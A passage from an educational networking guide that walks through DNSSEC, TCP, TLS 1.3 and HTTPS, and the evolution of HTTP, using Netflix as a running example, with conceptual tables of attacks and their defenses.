netflix.com RRSIG [signature over the A record]
netflix.com DNSKEY [public key to verify the signature]
```

DNSSEC doesn't encrypt DNS — it only authenticates responses. DoH/DoT encrypts; DNSSEC authenticates.

---

### DNS and Security — What Can Go Wrong

| Attack | What Happens | Defense |
|---|---|---|
| **Cache Poisoning** | Attacker injects fake DNS records into resolver cache | DNSSEC, DNS randomization |
| **DNS Hijacking** | ISP or attacker redirects all DNS to a different resolver | DoH/DoT, check resolver IP |
| **DNS Amplification DDoS** | Attacker spoofs victim's IP, sends small DNS queries → massive responses flood victim | Rate limiting, BCP38 filtering |
| **NXDOMAIN Hijacking** | ISP intercepts "domain not found" and shows ads | DoH to a trusted resolver |
| **DNS Exfiltration** | Malware encodes data in DNS queries to smuggle data out | Monitor for unusually long DNS names, high query rates |

---

### Across the series

- **Build a DNS client from raw bytes** in Go, including message compression and
  the transaction-ID check that defends against spoofing:
  [TCP/IP guide, Chapter 18](../networking/tcp-ip/real-life-guide-v1.md#chapter-18-dns-turning-names-into-addresses).
- **Operate DNS:** delegation, glue, SOA serials, negative caching, migration TTL
  timelines, DNSSEC failures, and a `dnsdiff` tool that compares resolvers:
  [TCP/IP guide, Chapter 55](../networking/tcp-ip/real-life-guide-v1.md#chapter-55-dns-operations-authoritative-dns-delegation-split-horizon-outages).
- **The HTTPS record** (type 65) that advertises HTTP/3 before the first
  connection is decoded by this guide's `protoprobe` lab in Chapter 14.
- **Happy Eyeballs in Go:** `net.Dialer` already races IPv6 and IPv4 for you.
  Its `FallbackDelay` field (default 300 ms) is the head start IPv6 gets
  before an IPv4 attempt begins.

### Key Takeaways

- DNS translates `www.netflix.com` → `52.38.36.82`. Without it you'd memorize IPs.
- Resolution is a **chain**: Stub Resolver → Recursive Resolver → Root NS → TLD NS → Authoritative NS.
- Results are **cached at every layer** based on TTL. Short TTL = fast failover, more queries.
- **DoH/DoT** encrypts DNS queries so ISPs can't snoop. DoH is most widely used.
- **DNSSEC** prevents fake answers by digitally signing records.
- Short TTLs can enable faster DNS-based traffic shifts, but exact behavior
  depends on resolver caching and the service's DNS/CDN architecture.
- The **CAA record** prevents unauthorized CAs from issuing TLS certs for a domain.

---

# Part 2 — Getting there reliably and privately

Part 1 got a packet to the right IP address — that's an address, not a
connection. This part builds an actual connection on top of that address
(TCP), then wraps it in a layer that keeps it private and provably authentic
(TLS). Together they're the reliability and the "S" in HTTPS.

## Chapter 3 — TCP: Reliable Delivery

> We have the IP address. Now we need to open a connection. TCP is the protocol that makes sure every byte arrives, in order, reliably.

---

### The Simple Version (5-year-old)

Imagine you want to have a phone conversation with Netflix.

- First you **call them** (SYN). They **pick up and say hello** (SYN-ACK). You **say "great, I can hear you"** (ACK). Now you're talking. This is the **3-way handshake**.
- While talking, if they say something and you don't respond, they **repeat it**. If you say something and they don't respond, **you repeat it**. Nothing gets lost.
- When done, you both **say goodbye properly** (FIN/ACK). The line is closed cleanly.

TCP is a **reliable, ordered byte stream** when the connection survives. UDP
(the alternative) is like shouting into a crowd — faster and simpler, but the
transport itself does not promise delivery or ordering.

---

### TCP vs UDP — When to Use Which

| Feature | TCP | UDP |
|---|---|---|
| Connection | Yes (handshake required) | No (fire and forget) |
| Reliability | Retransmits lost segments while the connection is alive | No delivery guarantee from UDP itself |
| Ordering | Delivers bytes to the app in order | Datagrams may arrive out of order |
| Error checking | Yes (checksum + retransmit) | Checksum only |
| Speed | Slower (overhead of guarantees) | Faster |
| Use case | HTTP, HTTPS, email, file transfer | DNS, video streaming, gaming, VoIP |

Most HTTPS page loads historically used **TCP** with HTTP/1.1 or HTTP/2. Many
large sites now also support **HTTP/3 over QUIC**, which uses UDP underneath
but adds encryption, congestion control, stream management, and reliability at
the QUIC layer.

---

### The TCP 3-Way Handshake

Before any data is exchanged, TCP establishes a connection. This takes **1 Round Trip Time (RTT)**.

```
Client (your browser)              Server (Netflix edge, port 443)
        │                                      │
        │──── SYN ────────────────────────────►│
        │  seq=1000, SYN flag set               │
        │  "I want to connect. My starting      │
        │   sequence number is 1000."           │
        │                                      │
        │◄─── SYN-ACK ─────────────────────────│
        │  seq=5000, ack=1001                   │
        │  "OK. My starting seq is 5000.        │
        │   I confirm I received up to byte 1000│
        │   (ack=1001 means 'send me 1001 next')│
        │                                      │
        │──── ACK ────────────────────────────►│
        │  ack=5001                             │
        │  "Got it. Connection is open."        │
        │                                      │
        │         [CONNECTION ESTABLISHED]      │
        │  Data exchange can now begin          │
```

**SYN** = Synchronize (start a new connection)
**ACK** = Acknowledge (confirm receipt)

The client and server each pick a **random initial sequence number**. This prevents attackers from guessing sequence numbers and injecting fake data.

---

### TCP Segment Structure

Every chunk of data sent over TCP is wrapped in a **segment** with a header:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
┌─────────────────────────┬─────────────────────────────────────────┐
│      Source Port        │         Destination Port                │
├─────────────────────────┴─────────────────────────────────────────┤
│                        Sequence Number                            │
├───────────────────────────────────────────────────────────────────┤
│                     Acknowledgment Number                         │
├──────┬──────────┬─────────────────────────────────────────────────┤
│Offset│ Reserved │ Flags: URG ACK PSH RST SYN FIN                 │
├──────┴──────────┴─────────────────────────────────────────────────┤
│                Window Size              │       Checksum          │
├─────────────────────────────────────────┴─────────────────────────┤
│              Urgent Pointer             │       Options           │
├─────────────────────────────────────────────────────────────────── ┤
│                           DATA (payload)                          │
└───────────────────────────────────────────────────────────────────┘
```

Key fields:
- **Source Port / Dest Port**: Identifies the application (e.g., your browser tab on port 54321, Netflix on port 443).
- **Sequence Number**: Byte offset of this segment in the stream. Receiver uses this to reassemble data in order.
- **Acknowledgment Number**: "I have received all bytes up to this number. Send me this number next."
- **Flags**: Control bits — SYN, ACK, FIN, RST, PSH, URG.
- **Window Size**: How many bytes sender can transmit before needing an ACK (flow control).
- **Checksum**: Detects bit errors.

#### MSS — Maximum Segment Size

The maximum amount of data in a single TCP segment. Negotiated during the handshake.

```
Ethernet MTU: 1500 bytes
  - IP header:  20 bytes
  - TCP header: 20 bytes
  = MSS: 1460 bytes of actual data per segment
```

If a request is larger than 1460 bytes, TCP splits it into multiple segments automatically.

---

### Reliable Delivery — How TCP Guarantees Nothing is Lost

Every segment must be acknowledged. If an ACK isn't received within a timeout period, the segment is **retransmitted**.

```
Client                          Server
  │                                │
  │──── Segment 1 (bytes 1-1460) ─►│
  │──── Segment 2 (bytes 1461-2920)►│
  │──── Segment 3 (bytes 2921-4380)►│ ← LOST in transit
  │                                │
  │◄─── ACK 2921 ──────────────────│  "I got up to byte 2920, send 2921 next"
  │                                │
  │  [Timeout waiting for ACK 4381]│
  │                                │
  │──── Segment 3 (retransmit) ───►│  Client resends the lost segment
  │                                │
  │◄─── ACK 4381 ──────────────────│  "Got it. Send 4381 next."
```

**Cumulative ACKs**: A single ACK covers all bytes received up to that point. If segments arrive out of order, the receiver holds them in a buffer and sends a **Duplicate ACK** (same ACK number repeated) to signal the gap.

**Three Duplicate ACKs** trigger **Fast Retransmit** — the sender immediately resends the missing segment without waiting for the timeout. Faster recovery than waiting for the timeout.

---

### Flow Control — Window Size

The receiver tells the sender how much buffer space it has available via the **Window Size** field. The sender must not send more data than the receiver can buffer.

```
Server has 65535 bytes of receive buffer.
Server sends: Window=65535 "You can send up to 65535 bytes without waiting for ACK"

Client sends 65535 bytes.
Server processes some data, buffer empties.
Server sends: Window=32768 "I've made room. You can send 32768 more bytes."

If server sends Window=0:
  Client must stop sending. Waits for server to open the window.
  (This is called "zero window" — a common performance problem)
```

---

### Congestion Control — Sharing the Network Fairly

The network between you and Netflix is shared by millions of users. If everyone sends at full speed, routers get overwhelmed and drop packets. TCP includes **congestion control** to prevent this.

#### Slow Start

When a connection opens, TCP starts conservatively and ramps up:

```
Round 1: Send 1 segment (1 × MSS)
Round 2: Send 2 segments (2 × MSS)   (doubles every RTT — exponential growth)
Round 3: Send 4 segments
Round 4: Send 8 segments
...
Until: Slow Start Threshold (ssthresh) is reached → switch to Congestion Avoidance

Congestion Avoidance: increase by 1 MSS per RTT (linear, careful growth)

If packet loss detected:
  → Assume network is congested
  → Cut window in half (or back to 1 with older algorithms)
  → Start over or resume from ssthresh
```

#### CUBIC (default on Linux)

CUBIC is the default congestion control algorithm on Linux servers (Netflix runs Linux). Instead of halving on loss, CUBIC uses a cubic function to probe for more bandwidth more aggressively after a loss, converging faster on the available bandwidth.

#### BBR (Bottleneck Bandwidth and Round-trip propagation time)

Google's newer algorithm. Instead of using packet loss as a congestion signal, BBR directly estimates the **bottleneck bandwidth** and **RTT**. Performs much better on long-latency paths and networks where some packet loss is normal (not caused by congestion). Netflix and Google use BBR for streaming.

---

### Connection Teardown — Saying Goodbye

TCP closes gracefully with a **4-way FIN exchange**:

```
Client                          Server
  │                                │
  │──── FIN ───────────────────────►│  "I'm done sending."
  │◄─── ACK ───────────────────────│  "OK, I received your FIN."
  │                                │  Server may still have data to send
  │◄─── FIN ───────────────────────│  "I'm done sending too."
  │──── ACK ───────────────────────►│  "Acknowledged."
  │                                │
        [CONNECTION CLOSED]
```

**RST (Reset)**: For abrupt termination — "this connection is invalid, stop immediately." Used when a connection is refused or something goes wrong.

**TIME_WAIT state**: After sending the final ACK, the client waits 2×MSL (Maximum Segment Lifetime, typically 2 minutes) before fully closing. This ensures the final ACK is not lost and allows delayed packets to be discarded. This is why restarting servers sometimes fails to bind to the same port immediately — old sockets are in TIME_WAIT.

---

### TCP Fast Open (TFO)

Normal TCP requires a full handshake (1 RTT) before data can be sent. **TFO** lets you send data along with the SYN packet on subsequent connections, saving 1 RTT.

```
First connection (normal):
  SYN → SYN-ACK → ACK → [data]     (1 RTT before data)

Server issues a TFO cookie (cryptographic token for your IP).

Subsequent connection (TFO):
  SYN + [data] + TFO cookie → SYN-ACK + [response data]
  (Data is in flight immediately with the SYN — 0 RTT for data)
```

TFO is supported by most modern OS and servers but disabled on some because 0-RTT data is **replay-vulnerable** (see TLS 0-RTT section).

---

### Ports — Which App Gets the Packet?

Multiple applications run on the same server simultaneously. TCP **port numbers** (0–65535) route packets to the right application:

```
Packet arrives at Netflix server 10.0.4.55:
  Destination Port: 443  →  HTTPS server (Nginx)
  Destination Port: 22   →  SSH server
  Destination Port: 9200 →  Elasticsearch

Well-known ports:
  80   → HTTP
  443  → HTTPS
  22   → SSH
  53   → DNS
  25   → SMTP (email)
  3306 → MySQL
  6379 → Redis
```

A connection is uniquely identified by the **4-tuple**: `(src IP, src port, dst IP, dst port)`.

---

### Across the series

The [TCP/IP guide's Parts 5–6](../networking/tcp-ip/real-life-guide-v1.md#part-5-ports-and-the-transport-layer) go much deeper, each with a Go
lab you can run:

| Concept here | Go lab there |
|---|---|
| The 3-way handshake; refused vs timed out | `dialcheck`, [Chapter 21](../networking/tcp-ip/real-life-guide-v1.md#chapter-21-tcp-part-1-the-three-way-handshake) |
| TCP is a byte stream; framing | `stream`, [Chapter 22](../networking/tcp-ip/real-life-guide-v1.md#chapter-22-tcp-part-2-how-it-never-loses-your-data) |
| Connection teardown; CLOSE_WAIT leaks | `closewait`, [Chapter 23](../networking/tcp-ip/real-life-guide-v1.md#chapter-23-tcp-part-3-closing-a-connection-and-the-states) |
| Flow control; zero window | `zerowindow`, [Chapter 24](../networking/tcp-ip/real-life-guide-v1.md#chapter-24-flow-control-the-sliding-window) |
| Nagle + delayed ACK (the 40 ms stall) | `nagle`, [Chapter 26](../networking/tcp-ip/real-life-guide-v1.md#chapter-26-the-40-millisecond-mystery) |
| Bandwidth-delay product | `bdp`, [Chapter 59](../networking/tcp-ip/real-life-guide-v1.md#chapter-59-network-performance-engineering-qos-packet-loss-shaping-saturation) |
| Kernel view of a live connection (`TCP_INFO`) | `tcpinfo`, [Chapter 33](../networking/tcp-ip/real-life-guide-v1.md#chapter-33-ss-what-your-machine-s-connections-are-doing) |

The [Linux guide's sockets chapter](../os-linux/real-life-os-guide.md#chapter-19-pipes-sockets-shared-memory-and-message-queues) explains the same
connection from the operating system's side: file descriptors, buffers, and
the system calls involved.

### Key Takeaways

- TCP is **reliable, ordered, connection-oriented**. Nothing is lost, everything arrives in sequence.
- The **3-way handshake** (SYN → SYN-ACK → ACK) costs 1 RTT before any data flows.
- **Sequence numbers + ACKs** provide reliable, ordered delivery while the TCP
  connection remains healthy. Lost segments are retransmitted.
- **Window size** (flow control) prevents the sender from overwhelming the receiver.
- **Congestion control** (Slow Start, CUBIC, BBR) prevents overwhelming the network.
- **TCP Fast Open** saves 1 RTT on repeat connections by piggybacking data on the SYN.
- A TCP connection is identified by the 4-tuple: src IP, src port, dst IP, dst port.
- Ports tell the OS which application should receive the data (443 = HTTPS).

---

## Chapter 4 — TLS & HTTPS: The Encrypted Tunnel

> TCP gives us a reliable connection. TLS makes it private and secure. Together they form HTTPS — the S stands for Secure.

---

### The Simple Version (5-year-old)

Imagine you and Netflix want to pass notes in class, but you don't want the teacher (or anyone else) to read them.

Before passing the first note, you both do a **secret handshake**:
- You agree on a **secret code** (cipher).
- You use a **magic trick** so you both know the same code **without ever writing it on paper** (Diffie-Hellman key exchange — no key is ever transmitted).
- Netflix shows you their **ID card** (certificate) — signed by a trusted authority (like a government-issued ID) so you know it's really Netflix and not an imposter.

Now every note you pass is written in the secret code. Even if someone intercepts the note, they see scrambled gibberish.

That is TLS.

---

### HTTP vs HTTPS

| | HTTP | HTTPS |
|---|---|---|
| Full name | HyperText Transfer Protocol | HTTP + TLS |
| Port | 80 | 443 |
| Encryption | None — plaintext | Negotiated authenticated encryption, commonly AES-GCM or ChaCha20-Poly1305 |
| Authentication | None — can't verify server identity | Certificate proves server identity |
| Integrity | None — data can be modified in transit | Authenticated encryption detects tampering |
| Visible to ISP | Everything (URLs, cookies, content) | Destination IP, timing, size, and usually hostname via SNI unless ECH is used |

---

### What TLS Provides

TLS gives three security properties:

1. **Confidentiality** — data is encrypted. Nobody can read it in transit.
2. **Integrity** — TLS records are authenticated, so tampering is detected.
3. **Authentication** — the certificate helps prove you're talking to the holder of the private key for that hostname, chained to a trusted CA.

---

### TLS 1.3 Handshake — Step by Step

TLS 1.3 (standardized in RFC 8446) usually completes in **1 Round Trip Time
(RTT)** for a fresh connection — faster than a typical TLS 1.2 full handshake.

```
Client (browser)                       Server (Netflix edge)
       │                                         │
       │───── ClientHello ───────────────────────►│
       │  • TLS version: 1.3                      │
       │  • Supported cipher suites:              │
       │      TLS_AES_256_GCM_SHA384              │
       │      TLS_CHACHA20_POLY1305_SHA256         │
       │  • Client's DH key share (public)        │
       │  • SNI: "www.netflix.com"                │  ← Which hostname?
       │  • ALPN: ["h2", "http/1.1"]              │  ← Which HTTP version?
       │  • Session ticket (if resuming)          │
       │                                         │
       │◄──── ServerHello + {encrypted} ─────────│
       │  • Selected cipher: AES_256_GCM_SHA384   │
       │  • Server's DH key share (public)        │
       │  ┌── encrypted from here ─────────────┐  │
       │  │ • Certificate chain                │  │
       │  │   (netflix.com cert + DigiCert CA) │  │
       │  │ • CertificateVerify                │  │
       │  │   (proves server owns private key) │  │
       │  │ • Finished                         │  │
       │  │   (authenticator over handshake)   │  │
       │  └────────────────────────────────────┘  │
       │                                         │
       │  [Browser verifies certificate]          │
       │  [Both sides independently derive        │
       │   the same session keys via ECDHE]       │
       │                                         │
       │───── Finished (encrypted) ──────────────►│
       │  Authenticator over entire handshake     │
       │                                         │
       │  [Encrypted channel established]         │
       │  HTTP/2 request can now be sent          │
```

**Total cost:** 1 RTT for TLS handshake + 1 RTT for TCP handshake = 2 RTTs before first byte of HTTP data.

---

### Key Exchange — The Magic of ECDHE

The most important question in TLS: **how do two parties agree on a secret key without ever sending that key over the network?**

If an attacker records your entire TLS handshake, they must not be able to decrypt it — even if they later steal the server's private key.

This property is called **Forward Secrecy**.

#### Diffie-Hellman Key Exchange (Simple Analogy)

Imagine you and Netflix both have a common **base color** (public — everyone knows it). You each mix in your own **secret color** privately. You exchange your mixed colors. Each of you then mixes the other's mixed color with your own secret. You both end up with the **same final color** — but nobody watching the exchange ever sees either secret color.

#### ECDHE — Elliptic Curve Diffie-Hellman Ephemeral

```
1. Both agree on a public elliptic curve (e.g., X25519) — public knowledge.

2. Client generates a random private key (a secret number).
   Client computes: public_key_client = private_key_client × generator_point

3. Server generates a random private key.
   Server computes: public_key_server = private_key_server × generator_point

4. They exchange public keys (visible to everyone).

5. Client computes: shared_secret = private_key_client × public_key_server
   Server computes: shared_secret = private_key_server × public_key_client

   These are mathematically equal! Both get the same shared_secret.
   But an eavesdropper who sees both public keys cannot compute shared_secret
   (Elliptic Curve Discrete Logarithm Problem — computationally infeasible).

6. shared_secret → key derivation → session keys for encryption
```

**Ephemeral** means a new key pair is generated for every connection. Even if you crack today's session key, you cannot decrypt past or future sessions. This is forward secrecy.

---

### TLS Certificate — Proving Identity

The server's certificate answers: "Is this really netflix.com?"

A certificate is a digital document containing:
- **Subject**: `www.netflix.com`
- **Issuer**: `DigiCert SHA2 Secure Server CA` (the Certificate Authority)
- **Public Key**: Netflix's public key
- **Validity Period**: Not Before / Not After
- **Signature**: DigiCert's digital signature over all the above
- **SANs (Subject Alternative Names)**: Other hostnames this cert is valid for (`*.netflix.com`)

#### Certificate Chain of Trust

No single authority is universally trusted. Instead, there is a **hierarchy**:

```
Root CA (DigiCert Global Root CA)
  │  Self-signed. Pre-installed in your OS/browser trust store.
  │  Signs the Intermediate CA certificate.
  │
  └──► Intermediate CA (DigiCert SHA2 Secure Server CA)
         │  Signed by Root CA.
         │  Signs Netflix's certificate.
         │
         └──► End-Entity Certificate (www.netflix.com)
                Subject: www.netflix.com
                Issuer: DigiCert SHA2 Secure Server CA
                Signed by Intermediate CA.
```

**Why three levels?** Security. Root CA private keys are usually kept offline
or under very strict controls, while intermediate CAs handle day-to-day
issuance. If an intermediate CA is compromised, it can be revoked without
replacing the root trust anchor.

#### Certificate Validation Steps

When the browser receives Netflix's certificate:

```
1. Is the certificate's Subject (or SAN) = "www.netflix.com"?
   If NO → error: certificate name mismatch

2. Is the current date between the cert's Not Before and Not After?
   If NO → error: certificate expired

3. Is the Intermediate CA's certificate valid? (recursively up the chain)
   Is the Root CA in our trust store?
   If NO → error: untrusted certificate authority

4. Verify the signature: DigiCert's signature on the cert is valid?
   Use DigiCert's public key to verify.
   If NO → error: invalid signature

5. Is revocation information available and enforced by this client?
   If the browser has hard-fail revocation data or a required staple says
   revoked → error. In many ordinary OCSP failures, browsers historically
   soft-fail to avoid breaking the web.

6. CAA is normally checked by the CA before issuance, not by the browser on
   every connection. It prevents the wrong CA from issuing the certificate in
   the first place.

All checks pass → certificate trusted ✓
```

#### OCSP — Online Certificate Status Protocol

OCSP lets browsers check in real-time if a certificate has been revoked (e.g., Netflix's private key was stolen).

**Problem:** Browser must make a separate network request to DigiCert's OCSP server for every HTTPS connection — adds latency, privacy risk (DigiCert sees who you visit).

**OCSP Stapling (solution):** Netflix's server fetches the OCSP response from DigiCert itself (periodically), then **staples** (includes) it in the TLS handshake. Browser gets proof of validity without making a separate request.

---

### SNI — Server Name Indication

A single server IP may host thousands of websites (virtual hosting). Before TLS is established, the server doesn't know which certificate to present.

**SNI** solves this: the client includes the hostname (`www.netflix.com`) in the **ClientHello** — before encryption starts — so the server can select the right certificate.

```
ClientHello includes:
  SNI: "www.netflix.com"

Server selects:
  Certificate for www.netflix.com ✓  (not youtube.com, not google.com)
```

**Privacy implication:** SNI is sent in plaintext. Your ISP and anyone on the path can see which hostname you're connecting to (even though they can't see the content). **Encrypted Client Hello (ECH)** is a newer standard that encrypts the SNI.

---

### ALPN — Application Layer Protocol Negotiation

In the same ClientHello, the browser advertises which HTTP versions it supports:

```
ALPN: ["h2", "http/1.1"]
```

Server responds with its selection:
```
ALPN: "h2"   → use HTTP/2 over TLS/TCP
ALPN: "h3"   → use HTTP/3 inside QUIC's TLS 1.3 handshake
```

For HTTP/1.1 and HTTP/2 over TCP, ALPN avoids a separate upgrade roundtrip
after TLS is established. HTTP/3 uses QUIC, so browsers usually discover it via
`Alt-Svc` or HTTPS DNS records and then negotiate `h3` inside QUIC's TLS 1.3
handshake.

---

### SSL Termination, Bridging, and Passthrough

There are three ways to handle TLS at the edge:

#### 1. TLS termination (often called "SSL termination")

```
Client ──[HTTPS/TLS]──► Edge (Nginx/Envoy)  ──[HTTP or internal TLS]──► Origin
                              ▲
                    TLS terminates here.
                    Edge decrypts, reads HTTP, can cache/rate-limit/inspect.
                    Forwards plaintext or re-encrypts to origin.
```

**Pros:** Edge can inspect content (cache, rate limit, auth, WAF), lower origin CPU load.
**Cons:** Traffic between edge and origin is decrypted — must trust internal network or use internal TLS.

#### 2. SSL Bridging / Re-encryption

```
Client ──[TLS]──► Edge ──[NEW TLS connection]──► Origin
```

Edge terminates the client TLS session and creates a **new** TLS session to the origin. Edge can still inspect content. Two separate encrypted channels.

#### 3. SSL Passthrough

```
Client ──[TLS]──────────────────────────────► Origin
                  Edge only routes TCP stream.
                  Never decrypts. Cannot inspect.
```

**Pros:** Maximum privacy — even the edge doesn't see the content.
**Cons:** Cannot cache, cannot rate limit at HTTP level, cannot do WAF.

---

### Session Resumption — Not Starting from Scratch

TLS handshakes are expensive (crypto operations, certificate parsing). For returning users, TLS 1.3 allows session resumption:

#### TLS 1.3 Pre-Shared Key (PSK) — 0-RTT

```
First visit:
  Full TLS 1.3 handshake (1 RTT)
  Server sends a "session ticket" — an encrypted blob the client stores.

Returning visit:
  ClientHello + session ticket + [early data — the HTTP request!]
  ↓
  Server decrypts ticket, resumes session, processes early data immediately
  → HTTP response starts before TLS handshake even completes!
  → 0 RTT for returning users
```

**Security trade-off of 0-RTT:** Early data is **replay-vulnerable**. An attacker who captures your ClientHello + early data can resend it later. For this reason, 0-RTT is only used for **idempotent requests** (GET requests that don't change state). Never for POST/payments.

---

### TLS 1.3 vs TLS 1.2 — Why the Upgrade Matters

| Feature | TLS 1.2 | TLS 1.3 |
|---|---|---|
| Handshake RTTs | 2 RTTs | 1 RTT (0 RTT on resume) |
| Cipher suites | Many (some weak) | 5 (all strong) |
| Forward secrecy | Optional | Mandatory |
| RSA key exchange | Allowed (no forward secrecy) | Removed |
| Certificate in handshake | Plaintext | Encrypted |
| Downgrade attacks | Possible | Prevented (via Finished message) |
| Performance | Slower | Faster |

TLS 1.0 and 1.1 are deprecated (2020). TLS 1.2 is still widely used but being phased out. TLS 1.3 is the target.

---

### What an Attacker Can and Cannot See

With HTTPS correctly implemented:

| Information | Visible to attacker? |
|---|---|
| Destination IP address | YES — IP routing requires this |
| Destination hostname (SNI) | YES — sent in plaintext ClientHello (ECH fixes this) |
| HTTP method (GET/POST) | NO — inside TLS |
| URL path and query string | NO — inside TLS |
| Request headers | NO — inside TLS |
| Cookies | NO — inside TLS |
| Response body | NO — inside TLS |
| Response headers | NO — inside TLS |
| Timing / packet sizes | YES — traffic analysis possible |

---

### mTLS — Mutual TLS

Standard TLS: only the **server** proves its identity (via certificate). The client is anonymous.

**mTLS (Mutual TLS)**: Both the server AND the client present certificates. Both authenticate each other.

```
Standard TLS:
  Server presents cert → Browser verifies → Trust established

mTLS:
  Server presents cert → Client verifies
  Client presents cert → Server verifies
  → Both sides authenticated
```

**Used for:**
- Service-to-service authentication (microservices inside Netflix's cluster authenticate each other)
- Zero-trust networks (no implicit trust even inside the datacenter)
- API clients that need strong authentication beyond passwords

---

### Common TLS Attacks

| Attack | What Happens | Mitigation |
|---|---|---|
| **MITM (Man-in-the-Middle)** | Attacker intercepts and impersonates server | Certificate validation, HSTS |
| **Downgrade Attack** | Attacker forces negotiation to older, weaker TLS | TLS 1.3 Finished message detects tampering, HSTS |
| **BEAST** | Exploits TLS 1.0 CBC mode flaw | TLS 1.2+, AES-GCM |
| **POODLE** | SSLv3 CBC padding oracle | Disable SSLv3 |
| **HEARTBLEED** | OpenSSL bug leaking server memory (including private keys) | Patched OpenSSL, certificate rotation |
| **Certificate Misissuance** | CA issues cert for wrong domain | CAA records, Certificate Transparency |
| **Weak cipher suites** | Attacker forces use of weak encryption | TLS 1.3 eliminates weak ciphers |

#### Certificate Transparency (CT)

A public, append-only log of every TLS certificate ever issued. Browsers require certificates to be logged in CT logs. If a CA mistakenly issues `netflix.com` to an attacker, Netflix's monitoring will detect it within minutes.

---

### Across the series

- **Inspect any server's TLS from code:** the `tlsinspect` lab
  ([TCP/IP guide, Chapter 29](../networking/tcp-ip/real-life-guide-v1.md#chapter-29-tls-how-it-gets-encrypted)) prints version, cipher,
  ALPN, and the chain, and names the four classic certificate failures
  (expired, unknown authority, name mismatch, SNI refused).
- **Rotate certificates without downtime** with `tls.Config.GetCertificate`:
  [TCP/IP guide, Chapter 56](../networking/tcp-ip/real-life-guide-v1.md#chapter-56-tls-and-certificate-operations-expiry-chains-sni-rotation). Inventory and expiry
  scanning: this guide's [Chapter 16](#chapter-16-certificate-and-domain-operations-acme-rotation-ct-monitoring-and-emergency-revocation).
- **mTLS in Go:** the [Go guide's mTLS chapter](../Golang/real-life-golang-guide.md#50-mtls-client-certificate-authentication-end-to-end) builds a private CA
  and client-certificate authentication end to end. The Go plan's
  [Week 6](../Golang/detailed-90-day-plan/week6.md) adds a PKI generator and identity extraction.
- **Session resumption, measured:** in testing for the TCP/IP guide, a Go
  client resumed a TLS 1.3 session only after it had *read* from the first
  connection, because TLS 1.3 servers send the session ticket after the
  handshake.

### Key Takeaways

- **HTTPS = HTTP + TLS**. TLS provides encryption, integrity, and authentication.
- A fresh **TLS 1.3 handshake** usually costs 1 RTT. Keys are derived via
  **ECDHE** — the shared session key is not transmitted.
- **Certificates** prove server identity through a **chain of trust** from Root CA → Intermediate CA → End-entity cert.
- **SNI** tells the server which certificate to use when multiple sites share an IP.
- **SSL Termination** at the edge is standard — edge decrypts, inspects, and forwards.
- **0-RTT resumption** is fast but replay-vulnerable — safe for GET, not POST.
- **mTLS** authenticates both sides — used for internal service-to-service communication.
- **Certificate Transparency** makes misissued certificates publicly visible.

---

# Part 3 — The conversation and the map

You now have a private, reliable, ordered channel open. Chapter 5 is what
actually flows through it — the request/response language of the web, in
full header-by-header detail. Chapter 6 then steps back and gives you the
7-layer OSI framework that organizes everything from Part 1 through here
into one mental map — deliberately taught last, once you have concrete
mechanisms to hang it on rather than abstract boxes to memorize first.

## Chapter 5 — HTTP: The Conversation

> TLS gave us an encrypted tunnel. Now we use HTTP to actually talk — to ask for pages and get them back.

---

### The Simple Version (5-year-old)

HTTP is the **language** your browser and Netflix use to talk to each other.

Your browser says: **"Please give me the home page."**
Netflix says: **"Here it is! Also, here are some extra notes about it — how long to keep it, if it's secret, etc."**

These "extra notes" are called **headers**. The actual page content is called the **body**.

---

### HTTP Versions — How We Got Here

| Version | Year | Key Feature | Transport |
|---|---|---|---|
| HTTP/0.9 | 1991 | Only GET, no headers | TCP |
| HTTP/1.0 | 1996 | Headers, status codes, one connection per request | TCP |
| HTTP/1.1 | 1997 | Keep-alive (reuse connections), pipelining, chunked encoding | TCP |
| HTTP/2 | 2015 | Multiplexing, header compression (HPACK), server push, binary | TCP |
| HTTP/3 | 2022 | Built on QUIC (UDP), 0-RTT, no TCP head-of-line blocking | UDP (QUIC) |

Modern large sites commonly support HTTP/2 and increasingly HTTP/3, but the
version used by any one request depends on browser support, server support,
network policy, and fallback behavior.

---

### HTTP/1.1 — The Foundation

HTTP/1.1 is a **text-based** protocol. Both request and response are human-readable.

#### Basic Structure

```
[Method] [Path] [Version]
[Header]: [Value]
[Header]: [Value]
[blank line]
[Body — optional]
```

#### Problem with HTTP/1.1: Head-of-Line Blocking

HTTP/1.1 sends one request at a time per connection (pipelining was specified but rarely worked). Loading a page with 50 resources (CSS, JS, images) sequentially over one connection is slow.

**Workaround:** Browsers open 6 parallel TCP connections per domain. But each connection has its own TCP and TLS handshake overhead.

---

### HTTP/2 — Multiplexing

HTTP/2 solves head-of-line blocking by multiplexing multiple **streams** over a **single TCP connection**.

#### Key HTTP/2 Concepts

**Streams:** Each HTTP request/response pair is a stream with a unique stream ID. Multiple streams fly over one TCP connection simultaneously — no waiting.

```
One TCP connection:
  Stream 1: GET /index.html   ────────────────────────►
  Stream 3: GET /style.css    ──────────────────►
  Stream 5: GET /app.js       ────────────────────────────────►
  Stream 7: GET /logo.png     ──────────────────────────►
  All in parallel, interleaved, over ONE TCP connection.
```

**Binary Protocol:** HTTP/2 uses a binary framing layer instead of text. Smaller, faster, less error-prone to parse.

**HPACK Header Compression:** HTTP headers are often large and repetitive (User-Agent, Cookie, Accept-Encoding are sent with every request). HPACK maintains a shared table of previously seen header values and references them by index instead of repeating the full string.

```
Request 1: User-Agent: Mozilla/5.0... (full string, 50 bytes)
Request 2: User-Agent: [index=1]       (1 byte — just a reference)
```

**Server Push:** Server can proactively send resources it knows the browser will need, before the browser asks:

```
Browser: GET /index.html
Server:  PUSH /style.css   ← sends this before browser asks
Server:  PUSH /app.js      ← sends this before browser asks
Server:  200 OK [index.html]
```

In practice, server push is tricky (may push things already in browser cache) and is being phased out in HTTP/3.

**HTTP/2 Limitation:** Head-of-line blocking at the TCP level. If one TCP segment is lost, all HTTP/2 streams on that connection stall waiting for retransmission. This is solved by HTTP/3.

---

### HTTP/3 — QUIC

HTTP/3 runs over **QUIC** — a new transport protocol that runs over **UDP** instead of TCP.

#### Why UDP?

QUIC implements its own reliability, ordering, and congestion control on top of UDP. This allows:

```
HTTP/2 over TCP:
  Stream 1, Stream 2, Stream 3 — all over one TCP connection
  If TCP packet is lost → ALL streams stall waiting for retransmit
  This is TCP head-of-line blocking.

HTTP/3 over QUIC:
  Stream 1, Stream 2, Stream 3 — each is independent
  If QUIC packet for Stream 1 is lost → only Stream 1 stalls
  Streams 2 and 3 continue unaffected
  This eliminates head-of-line blocking completely.
```

